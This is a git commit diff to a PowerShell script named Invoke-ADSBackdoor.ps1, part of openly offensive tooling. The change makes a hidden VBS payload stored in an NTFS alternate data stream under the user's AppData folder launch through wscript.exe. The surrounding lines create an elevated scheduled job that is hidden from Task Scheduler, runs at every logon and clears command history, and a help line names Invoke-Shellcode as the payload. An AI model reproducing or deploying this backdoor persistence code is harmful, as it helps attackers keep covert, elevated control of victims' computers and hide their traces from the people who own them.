5daf1f09067d6adb8f2b9fd57753b515cb493327
simonpunk <simonp230446@hotmail.com>
2016-07-09 23:05:51 -0500

    Update Invoke-ADSBackdoor.ps1

--- Invoke-ADSBackdoor.ps1
+++ Invoke-ADSBackdoor.ps1
@@ -96,7 +96,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        Clear-History
     }
     else {
-       $script = "$env:USERPROFILE\AppData:$vbsFile"
+       $script = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
       # $Trig = New-JobTrigger -Once -At (Get-Date).AddMinutes(30) -RepeatIndefinitely -RepetitionInterval "00:30:00"
        $Trig = New-JobTrigger -AtLogOn
